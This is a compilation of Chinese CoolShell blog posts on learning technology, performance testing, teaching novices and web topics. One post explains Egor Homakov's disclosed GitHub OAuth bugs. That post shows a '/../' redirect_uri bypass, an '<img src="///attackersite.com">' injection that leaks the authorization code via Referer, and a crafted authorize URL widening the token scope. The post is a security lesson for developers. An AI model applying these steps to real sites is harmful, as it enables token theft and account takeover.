#### 对于日新月异的新技术，你是什么态度？遇到新技术我会去了解，但不会把很大的精力放在这些技术（如：NoSQL，Node.js，等）。这些技术尚不成熟，只需要跟得住就可以了。技术十年以上可能是一个门槛。有人说技术更新换代很快，我一点儿都不觉得是这样想。虽然有不成熟的技术不断地涌出，但是成熟的技术，比如Unix，40多年，C，40多年，C++，30多年，TCP/IP，20多年，Java也有将近20年了……，所以，如果你着眼成熟的技术，其实并不多。我的观点是—— **要了解技术就一定需要了解整个计算机的技术历史发展和进化路线。** （这个观点，我在《程序员练级攻略》和《C++的坑多吗？》中提到过多次了。）因为， **你要朝着球运动的轨迹去，而不是朝着球的位置去，要知道球的运动轨迹，你就需要知道它历史上是怎么跑的** 。如果要捋一个技术的脉络，70年代Unix的出现，是软件发展方面的一个里程碑，那个时期的C语言，也是语言方面的里程碑。（当时）所有的项目都在Unix/C上，全世界人都在用这两样东西写软件。Linux跟随的是Unix, Windows下的开发也是 C/C++。这时候出现的C++很自然就被大家接受了，企业级的系统很自然就会迁移到这上面，C++虽然接过了C的接力棒，但是它的问题是它没有一个企业方面的架构，而且太随意了，否则也不会有今天的Java。C++和C非常接近，它只不过是C的一个扩展，长年没有一个企业架构的框架。而Java在被发明后，被IBM把企业架构这部分的需求接了过来，J2EE的出现让C/C++捉襟见肘了，在语言进化上，还有Python/Ruby，后面还有了.NET，但可惜的是这只局限在Windows平台上。这些就是企业级软件方面语言层面就是C -> C++ -> Java这条主干，操作系统是Unix -> Linux/Windows这条主干，软件开发中需要了解的网络知识就是Ethernet -> IP -> TCP/UDP 这条主干。另外一条脉络就是互联网方面的（HTML/CSS/JS/LAMP…）。我是一个有技术忧虑症的人，这几条软件开发的主线一定不能放弃。
另外，从架构上来说，我们可以看到，* 从单机的年代，到C/S架构（界面，业务逻辑，数据SQL都在Client上，只有数据库服库在S上）   * 再到B/S结构（用浏览器来充当Client，但是传统的ASP/PHP/JSP/Perl/CGI这样的编程也都把界面，业务逻辑，和SQL都放在一起），但是B/S已经把这些东西放到了Web Server上，   * 再到后来的中间件，把业务逻辑再抽出一层，放到一个叫App Server上，经典的三层结构。   * 然后再到分布式结构，业务层分布式，数据层分布式。   * 再到今天的云架构——全部移到服务器。我们可以看到技术的变迁都一直再把东西往后端移，前端只剩一个浏览器或是一个手机。通过这个你可以看到整个技术发展的趋势。所以，如果你了解了这些变迁，了解了这些变迁过程“不断填坑”的过程，你将会对技术有很强的把握。另外，我听到有很多人说，一些技术不适用，一些技术太学院派，但对我来说，无论是应用还是学术，我都会看，知识不愁多。何必搞应用的和搞学术的分开阵营，都是知识，学就好了。技术的发展要根植于历史，而不是未来。不要和我描述这个技术的未来会多么美好（InfoQ 的 ArchSummit大会上有一个微软来的人把Node.js说得跟仙女一样，然后给了一个Hello World），我承认你用一些新的技术可以实现很多花哨的东西。但是，我认为技术都是承前的，只有承前的才会常青。所以说“某某（技术）要火”这样的话是没有意义的，等它火了、应用多了，规模大了，再说。有些人说：“不学C/C++也是没有问题的”，我对此的回应是： **如果连技术主干都可以不学的话，还有什么其他的好学呢？这些是计算机发展的根、脉络、祖师爷，这样的东西怎么可以不学呢？**
****另外，我们要去了解整个计算机文化，我觉得计算机文化源起于Unix/C这条线上（注意，我说的是文化不是技术）。我也写过很多与Unix文化相关的文章，大家可以看看我写的“Unix传奇")（尤其是下篇")）”。#### 可是在应用环境中，对新技术的需求是很高的，你觉得在教育领域计算机科学的侧重应该是什么样的？学校教的大部分都是知识密集型的技术，但是社会上的企业大部分都是劳动密集型的。什么是劳动密集型的企业呢？麦当劳炸薯条就是劳动密集型的工作，用不到学校教授的那些知识。如果有一天你不炸薯条了，而要去做更大更专业的东西，学校里的知识就会派上用场。有人说一个语言、一个技术，能解决问题能用就行了，我不这样认为。 **我觉得你应该至少要知道这些演变和进化的过程。而如果你要解决一些业务和技术难题，就需要抓住某种技术很深入地学习，当成艺术一样来学习。**我在“软件开发‘三重门’”里说过，第一重门是业务功能，在这重门里，的确是会编程就可以了；第二重门是业务性能，在这一重门里，技术的基础就很管用了，比如：操作系统的文件管理，进程调度，内存管理，网络的七层模型，TCP/ ~~UCP~~ UDP的协议，语言用法、编译和类库的实现，数据结构，算法等等就非常关键了；第三重门是业务智能，在这一重门里，你会发现很多东西都很学院派了，比如，搜索算法，推荐算法，预测，统计，机器学习，图像识别，分布式架构和算法，等等，你需要读很多计算机学院派的论文。
总之，这主要看你职业生涯的背景了，如果你整天被当作劳动力来使用，你用到的技术就比较浅，比较实用，但是如果你做一些知识密集型的工作，你就需要用心来搞搞研究，就会发现你需要理论上的知识。比如说，我之前做过的跨国库存调配，需要知道最短路径的算法，而我现在在亚马逊做的库存预测系统，数据挖掘的那些东西都需要很强的数学建模、算法、数据挖掘的功底。我觉得真正的高手都来自知识密集型的学院派。他们更强的是，可以把那些理论的基础知识应用到现在的业务上来。但很可惜， **我们国内今天的教育并没有很好地把那些学院派的理论知识和现实的业务问题很好地接合起来。** 比如说一些哈希表或二叉树的数据结构，如果我们的学校在讲述这些知识的时候能够接合实际的业务问题，效果会非常不错，如：设计一个IP地址和地理位置的查询系统，设计一个分布式的NoSQL的数据库，或是设计一个地理位置的检索应用等等。在学习操作系统的时候，如果老师可以带学生做一个手机或嵌入式操作系统，或是研究一下Unix System V或是Linux的源码的话，会更有意思。在学习网络知识的时候，能带学生重点学一下以太网和TCP/IP的特性，并调优，如果能做一个网络上的pub/sub的消息系统或是做一个像Nginx一样的web server，那会更好。如果在学图形学的过程中能带领学生实践一个作图工具或是一个游戏引擎，那会更有意思。
总之，我们的教育和现实脱节太严重了，教的东西无论是在技术还是在实践上都严重落后和脱节，没有通过实际的业务或技术问题来教学生那些理论知识，这是一个失败。#### **那么，现在做一个软件开发者是否更加困难了？**我觉得倒不是。做一个软件开发者更简单了。因为现在互联网很发达，你可以找到很多共享的知识——相对于我那个时候。第一，知识你容易查到，然后社区很多，文章、分享的人也越来越多。我们那个时候没有的。上网一查，什么都没有。都得去自己琢磨，自己去调查。所以我觉得相比我们那个时候更容易了。第二，工具变多了。现在的工具比那个时候好用多了。我们那个时候就是一天到晚在vi里面，连个自动提示都没有，连个版本库管理都没有。不光工具变多，框架也多了，各种各样的编程框架。我们那时候都是生写。写JavaScript，生写，连个jQuery都没有。没有这些辅助性的、让你提高生产力的东西。J2EE那时候也没有。而且整个（开发环境）都很不成熟。一个服务器的最高配置就1GB的情况下，一个WebSphere起来就占了900多MB——这还能跑什么应用？所以只能去用最基础的系统。所以我觉得现在，无论是环境，还是开发的过程，都更规范了。以前我做开发的时候就是，什么都不懂就上了，瞎搞，没有什么开发规范，没有人理你，反正你搞得好就搞好，搞不好就搞不好了，全靠自己，包括做测试维护等等。我觉得现在的软件开发就很好，你一上去，就有好的工具，有好的知识库，有好的社区，有好的开发框架，还有好的流程，方法，甚至还有人帮你做测试，还有人告诉你应该怎么做。幸福得很。现在好多人还说这个不好那个不好，开发难什么的。其实容易多了。
但是，有个东西我觉得是现在的软件开发者比我们那时候变得更难的。就是，你享福了以后，人就变懒，变娇气了。对很多东西的抱怨就开始多了。我们那个时候哪有什么好抱怨的？没啥好抱怨的，有活就干，有东西学就赶快学。现在呢，学个什么东西还挑挑拣拣的，抱怨这个语言太扯，那个IDE不好，这个框架太差，版本管理工具太扯，等等。 **这就好像以前我没东西吃，只有个糠吃，要是有面包有馒头，我就觉得非常非常好了。现在是，好吃的东西多了我们还学会挑食了，这也不好用，那也不好用** 。根本就不是技术变难了，环境变差了，是程序员变娇气了。所以软件开发变难，归根结底还是程序员们自己变娇气了。#### 你如何在进度压力下，享受技术带来的快乐？中国人中庸的思想，入世和出世，每天的工作就是入世。举个例子，我十年前在上海的时候，给交通银行做项目的时候，每周休息一天，早九点到晚十点，每天工作12个小时，这样的工作持续了一整年，没有节假日，项目上的技术也没什么意思。当时我晚上十点回到住处，还想学一些C++/Java和Unix/Windows的技术，于是就看书到晚上11:30，每天如此，一年下来学到很多东西，时间没有荒废，心里就很开心。 **我觉得当时是快乐的，因为有成长的感觉是快乐的。**
现在的我，工作、写博客、养孩子，事情其实更多。我早上7:30起床，会浏览一下国外的新闻，hacker news, tech church, reddit, highavailability之类的站点，9点上班。晚上6、7点钟下班，开始带孩子。十点钟孩子睡了觉，我会开始重新细读一下这一天都发生了些什么事情。这个时间也有可能会用来看书。学习的过程（我）是不喜欢被打断的，所以从十点到十二点，家人都睡了，这正是我连续学习的好时间。可能从晚上11:30开始，我会做点笔记或者写博客。我现在对酷壳文章的质量要求比较高一些，所以大概积累一个星期的时间才可以生成一篇文章。每天我大概都在一两点钟才会睡觉。没办法，我有技术焦虑症。但是觉得这样的生活很充实，也很踏实。另外，任何一门技术玩深了，都是很有意思的。有些人形成了一个价值取向，“我只做什么，绝不做什么”。前段时间有一个刚来亚马逊的工程师，他原来做的是数据挖掘推荐系统，原来的公司重组要让他做前端，他不肯就离职了，他说他不想做前端。我觉得，前端后端都是编程，Javascript是编程，C++也是编程。 **编程不在于你用什么语言去coding，而是你组织程序、设计软件的能力，只要你上升到脑力劳动上来，用什么都一样，技术无贵贱。** 你可以不喜欢那个技术，但是还是要了解了解，也没有必要完全不用，完全抛弃。Javascript啊——只要能被Javascript实现的，未来总有一天会被Javascript所取代。
回到问题，怎么才能享受到快乐呢？* 第一，入世和出世要分开，不要让世俗的东西打扰到你的内心世界，你的情绪不应该为别人所控，也不应该被世俗所污染，活得真实，活得真实你才会快乐。* 第二，就是要有热情，有了热情，你的心情就会很好，加班都可以是快乐的，想一想我们整个通宵用来打游戏的时光，虽然很累，但是你也很开心，这都是因为有了热情的缘故。总之一句话—— **如果你没有兴趣，什么都是借口，如果你有兴趣了，什么都是好玩的** 。####（全文完）# Web版的VNC作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn想在Web上远程控制远端的电脑吗？Guacamole开源项目提供了这样的解决方案，其主要使用了HTML5和Ajax。下面是一个载图。如果你能够访问Youtube的话，你可以看看这个视频。Guacamole 一个 HTML5 + JavaScript (AJAX) 的 VNC 客户端是啊，HTML5强大了，什么都能干了，连Flash也要取代了。现如今，什么事都在往Web上移植了，Chrome也OS了。可以预见在HTML5出来后，未来这样的事情会越来越多，以后的一些移动和掌上设备真的只需要一个Web Browsers.
# 性能测试应该怎么做？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!PerfTest偶然间看到了阿里中间件Dubbo的性能测试报告，我觉得这份性能测试报告让人觉得做这性能测试的人根本不懂性能测试，我觉得这份报告会把大众带沟里去，所以，想写下这篇文章，做一点科普。首先，这份测试报告里的主要问题如下：**1）用的全是平均值** 。老实说，平均值是非常不靠谱的。**2）响应时间没有和吞吐量TPS/QPS挂钩** 。而只是测试了低速率的情况，这是完全错误的。**3）响应时间和吞吐量没有和成功率挂钩。**目录* 为什么平均值不靠谱   * 为什么响应时间（latency）要和吞吐量（Thoughput）挂钩   * 为什么响应时间吞吐量和成功率要挂钩   * 如何严谨地做性能测试#### 为什么平均值不靠谱关于平均值为什么不靠谱，我相信大家读新闻的时候经常可以看到， **平均工资** ， **平均房价** ， **平均支出** ，等等这样的字眼，你就知道为什么平均值不靠谱了。（这些都是数学游戏，对于理工科的同学来说，天生应该有免疫力）软件的性能测试也一样，平均数也是不靠谱的，这里可以参看这篇详细的文章《Why Averages Suck and Percentiles are Great》，我在这里简单说一下。
我们知道，性能测试时，测试得到的结果数据不总是一样的，而是有高有低的，如果算平均值就会出现这样的情况，假如，测试了10次，有9次是1ms，而有1次是1s，那么平均数据就是100ms，很明显，这完全不能反应性能测试的情况，也许那1s的请求就是一个不正常的值，是个噪点，应该去掉。所以，我们会在一些评委打分中看到要去掉一个最高分一个最低分，然后再算平均值。另外，中位数（Mean）可能会比平均数要稍微靠谱一些，所谓中位数的意就是把将一组数据按大小顺序排列，处在最中间位置的一个数叫做这组数据的中位数 ，这意味着至少有50%的数据低于或高于这个中位数。当然，最为正确的统计做法是用百分比分布统计。也就是英文中的TP – Top Percentile ，TP50的意思在，50%的请求都小于某个值，TP90表示90%的请求小于某个时间。比如：我们有一组数据：[ 10ms, 1s, 200ms, 100ms]，我们把其从小到大排个序：[10ms, 100ms, 200ms, 1s]，于是我们知道，TP50，就是50%的请求ceil(4*0.5)=2时间是小于100ms的，TP90就是90%的请求ceil(4*0.9)=4时间小于1s。于是：TP50就是100ms，TP90就是1s。
我以前在路透做的金融系统响应时间的性能测试的要求是这样的， **99.9%的请求必须小于1ms，所有的平均时间必须小于1ms。两个条件的限制。**#### 为什么响应时间（latency）要和吞吐量（Thoughput）挂钩系统的性能如果只看吞吐量，不看响应时间是没有意义的。我的系统可以顶10万请求，但是响应时间已经到了5秒钟，这样的系统已经不可用了，这样的吞吐量也是没有意义的。我们知道，当并发量（吞吐量）上涨的时候，系统会变得越来越不稳定，响应时间的波动也会越来越大，响应时间也会变得越来越慢，而吞吐率也越来越上不去（如下图所示），包括CPU的使用率情况也会如此。所以，当系统变得不稳定的时候，吞吐量已经没有意义了。吞吐量有意义的时候仅当系统稳定的时候。!BenchmarkOptimalRate所以， **吞吐量的值必需有响应时间来卡。** 比如： **TP99小于100ms的时候，系统可以承载的最大并发数是1000qps** 。这意味着，我们要不断的在不同的并发数上测试，以找到软件的最稳定时的最大吞吐量。#### 为什么响应时间吞吐量和成功率要挂钩我们这应该不难理解了，如果请求不成功的话，都还做毛的性能测试。比如，我说我的系统并发可以达到10万，但是失败率是
40%，那么，这10万的并发完全就是一个笑话了。性能测试的失败率的容忍应该是非常低的。对于一些关键系统，成功请求数必须在100%，一点都不能含糊。#### 如何严谨地做性能测试一般来说，性能测试要统一考虑这么几个因素： **Thoughput吞吐量** ， **Latency响应时间** ， **资源利用** （CPU/MEM/IO/Bandwidth…）， **成功率** ， **系统稳定性** 。下面的这些性能测试的方式基本上来源自我的老老东家汤森路透，一家做real-time的金融数据系统的公司。**一，你得定义一个系统的响应时间latency，建议是TP99，以及成功率** 。比如路透的定义：99.9%的响应时间必需在1ms之内，平均响应时间在1ms以内，100%的请求成功。**二，在这个响应时间的限制下，找到最高的吞吐量** 。测试用的数据，需要有大中小各种尺寸的数据，并可以混合。最好使用生产线上的测试数据。**三，在这个吞吐量做Soak Test，比如：使用第二步测试得到的吞吐量连续7天的不间断的压测系统。** 然后收集CPU，内存，硬盘/网络IO，等指标，查看系统是否稳定，比如，CPU是平稳的，内存使用也是平稳的。那么，这个值就是系统的性能
**四，找到系统的极限值。比如：在成功率100%的情况下（不考虑响应时间的长短），系统能坚持10分钟的吞吐量。****五，做Burst Test。用第二步得到的吞吐量执行5分钟，然后在第四步得到的极限值执行1分钟，再回到第二步的吞吐量执行5钟，再到第四步的权限值执行1分钟，如此往复个一段时间，比如2天。** 收集系统数据：CPU、内存、硬盘/网络IO等，观察他们的曲线，以及相应的响应时间，确保系统是稳定的。**六、低吞吐量和网络小包的测试。** 有时候，在低吞吐量的时候，可能会导致latency上升，比如TCP_NODELAY的参数没有开启会导致latency上升（详见TCP的那些事），而网络小包会导致带宽用不满也会导致性能上不去，所以，性能测试还需要根据实际情况有选择的测试一下这两咱场景。（注：在路透，路透会用第二步得到的吞吐量乘以66.7%来做为系统的软报警线，80%做为系统的硬报警线，而极限值仅仅用来扛突发的peak）**是不是很繁锁？是的，只因为，这是工程，工程是一门科学，科学是严谨的。**欢迎大家也分享一下你们性能测试的经验和方法。（全文完）# 老手是这样教新手编程的作者：陈皓，左耳朵耗子
来自：酷壳网 CoolShell https://coolshell.cncomp.lang.c全球最大的C语言新闻组，其Google的链接是：http://groups.google.com/group/comp.lang.c/ 可惜被GFW了。在comp.lang.c新闻组，有一个日本网友发了个贴子，说他正在学习一个在线的C语言课程，要完成一个作业，用程序输出如下的结果，而他的老师在美国，因为时差问题，他无法和他联系，所以只有上这里来寻求帮助。*     ***     *****     *******     *********     *********     *******     *****     ***     *很明显，在comp.lang.c上发这种贴子是一定会被拍的很惨的，这样的事，以前在SUN的论坛上也发生过，详情请看这里。还有一个去软件官网上要一个盗版序列号的。果不然后，我看到了这样的一个回贴。提供这样的一段代码：这段程序是可以编译通过的，没有任何问题，而且还是可以得到正确的结果的。关于这样的程序，你可以参考本站的这篇文章《6个变态的C语言Hello World程序》，而另一篇文章教你如何搞乱你的C代码。呵呵。当然，你并不需要把在你的VC或是GCC下编译这段代码，现在什么都有在线了，编译器当然也在线了，这里是一篇关于在线编译器的文章，甚至一个在线的IDE（连这个网站的CTO都在本站留言了），上去编译一下你就可以看到结果了。
最后，不恶搞了，在comp.lang.c的这个贴子中看到了很多不错的“如何教新手编程”的观点，下面罗列一些：1）你把你自认为最好程序贴出来，我会帮你看的，但我是不会帮你写的。2）要解决这个问题，你需要先观察输出，然后找到其规律，算法总是去描述一些有规律的事情。关于你的这个程序，很明显，你可以分成两个部分，一个正三角，一个倒三角，每一行的星号都是连续的奇数，1，3，5，7，9，而前面的空格又是顺序的自然数：4，3，2，1，你看这样的规律用程序来干不是正合适吗？从这两个例子，我们可以看到，老手应该如何去教新手，那就是，a）让其独立思考，b）步步为营的引导，c）教一种方法而不是直接给答案。希望与大家共勉。（全文完）# 在Web上运行Linux作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn一个叫Fabrice Bellard的程序员写了一段Javascript在Web浏览器中启动Linux（原网页，我把这个网页iframe在了下面），目前，你只能使用Firefox 4和Chrome 11运行这个Linux。这不是什么假的模仿Linux的东西，这是实实在在的运行一个Linux。这一举动还引起了很多很牛人的关注，包括Javascript的创建者Brendan Eich。
清除启动开始启动随后，Fabrice Bellard发布了相关的技术说明：，从这份文档中我们可以看到：* 这个模似器完全由Javascript写成   * CPU仿真器使用的是QEMU（接近于原古的486），为了装上Linux，其做了一些改动。   * Javascript的终端本来可以使用termlib，但他还是自己写了一个，因为OS的按键和Web浏览器不一样（here）   * Linux 使用了2.6.20内核，编译配置在这里，并做了一些小改动。   * 磁盘用的是Ram Disk，在启动的时候装载。其文件系统由Buildroot 和BusyBox产生。   * 在Home目录下有一个hello.c的程序，你可以使用TinyCC编译（tcc，参看酷壳的这篇文章）从这个事我有这些感触，1. 在Web上运行一个Linux的操作系统不是问题。那么在Web上还有什么不能做的吗？   2. Linux真是性能很高，在Javascript下运行感觉也不慢啊。   3. 真是Techno-Geek。# 用户界面和用户体验的差别作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
**用户界面设计**用户界面设计**用户体验设计**用户体验设计在便池上放一个假苍蝇会导致男人撒尿的时候会不由自主地瞄准它，有证据表明，这样的用户体验可以减少80%的小便溅出便池。# 从“黑掉Github”学Web安全开发作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnEgor Homakov（Twitter: @homakov 个人网站: EgorHomakov.com）是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——《How I hacked Github again》（墙）说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，所以， **我在这里用我的语言给大家阐述一下黑掉Github的思路以及原文中所提到的那5个bug。希望这篇文章能让从事Web开发的同学们警惕** 。关于Web开发中的安全事项，大家可以看看这篇文章《Web开发中的你需要了解的东西》目录* OAuth简介   * OAuth的Callback   * 第一个Bug — 没有检查重定向URL中的/../   * 第二个BUG — 没有校验token   * 第三个BUG — 注入跨站图片     * 像程序员一样的思考   * 第四个bug – Gist把github_token放在了cookie里   * 第五个Bug – 自动给gist授权   * 其它 & 感想
#### OAuth简介首先，这个故事要从Github OAuth讲起。所以，我们需要先知道什么是OAuth。所谓OAuth就是说，第三方的应用可以通过你的授权而不用知道你的帐号密码能够访问你在某网站的你自己的数据或功能。像Google, Facebook, Twitter等网站都提供了OAuth服务，提供OAuth服务的网站一般都有很多开放的API，第三方应用会调用这些API来开发他们的应用以让用户拥有更多的功能，但是，当用户在使用这些第三方应用的时候，这些第三方的应用会来访问用户的帐户内的功能和数据，所以，当第三应用要干这些事的时候，我们不能让第三方应用弹出一个对话框来问用户要他的帐号密码，不然第三方的应用就把用户的密码给获取了，所以，OAuth协议会跳转到一个页面，让用户授权给这个第三方应用以某些权限，然后，这个权限授权的记录保存在Google/Facebook/Twitter上，并向第三方应用返回一个授权token，于是第三方的应用通过这个token来操作某用户帐号的功能和数据时，就畅通无阻了。下图简单地说明了Twitter的OAuth的授权过程。从上面的流程图中，我们可以看OAuth不管是1.0还是2.0版本都是一个比较复杂的协议，所以，在Server端要把OAuth实现对并不是一些容易事，其总是或多或少会有些小错误。Egor就找到了几个Github的OAuth的实现的问题。
#### OAuth的Callback还需要注意的是，因为OAuth是需要跳到主站的网页上去让用户授权，当用户授权完后，需要跳转回原网页，所以，一般来说，OAuth授权页都会带一个 redirect_url的参数，用于指定跳转回原来的网页。Github使用的这个跳转参数是redirect_uri参数。一般来说，redirect_uri这个参数需要在服务器端进行验证。你想一下，如果有人可以控制这个redirect_uri这个参数，那么，你就可以让其跳转到别的网页上（可能会是个有恶意的网页）。如果你觉得跳转到别的网页上也无所谓，那么你就错了。别忘了，当你对这个第三方的应用授权通过后，服务方会给第三方应用返回一个授权token，这个token会被加到那个redirect_uri参数后面然后跳转回去，如果这个redirect_uri被别有用心的人改一个恶意的网址后，这个token也就被转过去了，于是授权token也就被泄漏过去了。知道了这一切，我们就可以理解Egor提的那5个bug是什么意思了。#### 第一个Bug — 没有检查重定向URL中的/../首先，我们通过Github的 redirect_uri 的说明文档我们可以看到这样的说明：
如果 CALLBACK URL是: http://example.com/pathGOOD: https://example.com/path     GOOD: http://example.com/path/subdir/otherBAD: http://example.com/bar     BAD: http://example.com/     BAD: http://example.com:8080/path     BAD: http://oauth.example.com:8080/path     BAD: http://example.org而Github对于redirect_uri做了限制，要求只能跳回到 https://gist.github.com/auth/github/callback/，也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。但是，Egor发现，Github的服务器端并没有验证.. /../../这样的情况。于是，Egor相当于构造了一个下面这样的Redirect URL：
https://gist.github.com/auth/github/callback/../../../homakov/8820324?code=CODE于是上面的URL就相当于：https://gist.github.com/homakov/8820324?code=CODE你可以看到，认证后的跳转网页转到了别的地方去（并非是github限制的地方）——我们知道Github的gist虽然是给你分享代码片段的，但是也可以用来定制自己的东西的（比如markdown），这个gist的网页当然是被Egor所控制的。#### 第二个BUG — 没有校验token第一个bug其实并没有什么，如果服务器端要校验一下token是否和之前生成的token的redirect_uri一模一样，只要服务器做了这个验证，第一个bug完全没有什么用处，但是，github的服务端并没有验证。这就是第二个bug，于是第一个和第二个bug组合起来成了一个相当有威力的安全漏洞。也就是说，token的生成要考虑redirect_uri，这样，当URL跳转的时候，会把redirect_uri和token带到跳转页面（这里的跳转页面还是github自己的），跳转页面的服务端程序要用redirect_uri来生成一个token，看看是不是和传来的token是一个样的。这就是所谓的对URL进行签名——以保证URL的不被人篡改。一般来说，对URL签名和对签名验证的因子包括，源IP，服务器时间截，session，或是再加个salt什么的。
#### 第三个BUG — 注入跨站图片现在，redirect_uri带着code，安全顺利地跳到了Egor构造的网页上：https://gist.github.com/homakov/8820324?code=CODE但是，这个是gist的网页，你无法在这个页面上运行前端（Javascript）或后端程序（Ruby——Github是Ruby做的），现在的问题是我们怎么得到那个code，因为那个code虽然后带到了我的网页上来，但那个网页还是github和用户自己的环境。到这里，一般来说，黑客会在这个页面上放一个诸如下面的一个链接，来引诱用户点击，：<a href=http://hack.you.com/>私人照片</a>这样，当页面跳转到黑客的网站上来后，你之前的网页上的网址会被加在http头里的 Refere 参数里，这样，我就可以得到你的token了。但是，在gist上放个链接还要用户去点一下，这个太影响“用户体验”了，最好能嵌入点外部的东西。gist上可以嵌入外站的图片，但是github的开发人员并非等闲之辈，对于外站的图片，其统统会把这些图片的url代理成github自己的url，所以，你很难搞定。
不过，我们可以用一个很诡异的技巧：**< img src=”///attackersite.com”>**这个是什么玩意？这个是个URL的相对路径。但是为什么会有三个///呢？呵呵。##### 像程序员一样的思考这个时候，我们需要以“程序员的编程思维”来思考问题——如果你是程序员，你会怎么写校验URL的程序？你一定会想到使用正则表达式，或是用程序来匹配URL中的一些pattern。于是，* 对于绝对路径：你会匹配两个//，后面的可能会是 [[email protected]](/cdn-cgi/l/email-protection)（user@是可选的），然后可能会有:<n>端口号，然后是/，后面是服务器的路径，再往后面应该是?后面带一些参数了。* 对于相对路径：就没有绝对路径那么复杂了。就是些 .. 和 /再加上?和一些参数。好了，如果coolshell.cn网页中的<img src=>或<a href=>中用到的相对路径是 /host.com，那么浏览器会解释成：https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成 https://coolshell.cn///host.com。
但是，Chrome和Firefox，会把///host.com当成绝对路径，因为其正确匹配了绝对路径的scheme。如果你正在用Chrome/Firefox看这篇文章 ，你可以看看下面的连接（源码如下）：CoolShell Test`<a href="///www.google.com">CoolShell Test</a>`关键是，这个Chrome/Firefox的问题被标记成了Won’t Fix，我勒个去，基本上来说，后台的程序也有可能有这样的问题，对于Perl，Python，Ruby，Node.js，PHP带的URL检查的函数库都有这样的问题。于是，我们就可以使用这样的方式给gist注入了一个第三方站点的图片（github的服务端没有察觉到（因为我们前面说过大多数语言的URL检查库都会被 Bypass了），但是浏览器端把这个链接解释到了第三方的站点上），于是请求这个图片的http头中的refere 中包含用户当前页面的URL，也包含了用户授权的code。到这里，黑客Egor已经拿到用户gist的权限并可以修改或查看用户私用的gist了。但是作者并没有满足，他想要的更多。#### 第四个bug – Gist把github_token放在了cookie里
于是Egor在用户的cookie里找到了 github_token但是这个token没什么用，因为授权的Scope只有gists。但是，这个token不应该放在用户端的cookie里，本身就是一个安全事故，这个东西只能放在服务端（关于Web开发中的安全事项，可以看看这篇文章《Web开发中的你需要了解的东西》）。于是，Egor只能另谋出路。#### 第五个Bug – 自动给gist授权因为gist是github自家的，Egor所以估计github想做得简单一点，当用户访问gist的时候，不会出弹出一个OAuth的页面来让用户授权，不然，用户就会很诧异，都是你们自家的东西，还要授权？所以，Egor猜测github应该是对gist做了自动授权，于是，Egor搞了这样的一个URL（注意其中的 redirect_uri中的scope ）https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub% **2Fcallback/../../../homakov/8820324** &response_type=code& **scope=repo,gists,user,delete_repo,notifications**
于是，这个redirect- uri不但帮黑客拿到了访问gist的token，而且还把授权token的scope扩大到了用户的代码库等其它权限。于是你就可以黑入用户的私有代码区了。####  其它 & 感想于是，作者从 Github Security Bug Bounty 拿到了USD $4,000的奖励！Egor一共花了从下午2点到6点一共4个小时找到了这些Bug，平均一小时1000美刀。Egor还很得瑟的说，如果Github请他做安全顾问，他只收一小时USD $400刀，这4个小时也就$1,600。呵呵。大家看看，这是多么有效率的赚钱方式。下图是Github上的赏金猎手的排行榜（）你可以上去挨个看看他们找到的问题，你会发现好些安全问题都很小，有些只能说是不是很规范的问题，Github都赏了几百刀。我查看了一下github的赏金政策，github赏金至少100刀，到5000刀不等。让我们扪心自问一下，我们花了多少时间在玩那些“红包游戏”，而又搞到了多少红包？人家4个小时找了5个bug，挣了$4000美金。 **老天给了你我一样的时间，我们用来抽几块钱的红包，人家用自己的技能来挣奖金。这就是人和人的差距。这就是所谓的效率** ——你可以移步看看我写的《加班与效率》
（全文完）# 十个Web开发文章和教程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是十个在2009年8月份里出现的十个非常不错的Web开发方面的文章和教程。推荐给大家，当然，都是英文啦。如果你愿意，欢迎翻译后提交给酷壳。1）一个简单的Lava 灯式的菜单（使用jQuery完成）2）使用jQuery自动生成文章内容的目录。就像是使用Word一样，设置一下标题，然后可以自动生成文章的目录。3）使用jQuery为图片创建图片标题和描述。这是一个超Cool的效果，当你的鼠标移到图片上的时候，图片的上下会出现遮覆，上面是标题，下面是描述，相当不错的用户体验，当鼠标移开后，遮覆消失。4）CSS3速成教程。主要讨论了CSS3的这些特性：旋转和改变大小，动画，Photoshop风格的遮罩，图片倒影，色彩渐变，转换等。有一个不错的flash视频。5）30+相当有用的Wordpress的巧门。相当相当不错的一些和Wordpress相关的插件和小巧门，非常非常地实用。6）htaccess技术的权威性指南。本文给出了12个非常有用的apache的设置，可以让你更容易设置你的站点，在这篇文章的最后，还列出了一些经验上的东西。另外，你可以参考本站的《16个简单实用的.htaccess小贴示》。
7）PHP正则表达式入门。一个相当不错的入门教程，写得简单易懂。8）你需要知道的8个正则表达式。正则表达式很有用，但是它具体用在什么地方呢？这篇文章给你了一票非常实用的示例。相当的不错。浏览这篇文章时别忘了看一下大家的回复，那里面也有很多不错的资源。9）20个可以改进表单的jQuery插件。都是相当实用的插件，可以让你的Web表单相当的成熟和有很好的用户体验。10）数据库，HTML，CSS，JS不适应的用法。很不错的文章，你需要记住下面的这个表格。Database_is for_ contentHTML_is for_ describing and displaying contentCSS_is for_ designJavaScript_is for_ functionality（全文完）# 几个有趣的漫画作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面的图片告诉你——行销，广告，公关，品牌有什么差别。**市场营销****公共关系(软文)****广告****品牌**那么，Apple，Google和你的公司的差别是什么呢？最后，让我们来看一个“真人版”的眼神跟着鼠标走的FLASH吧，单击下面的图片访问网站：
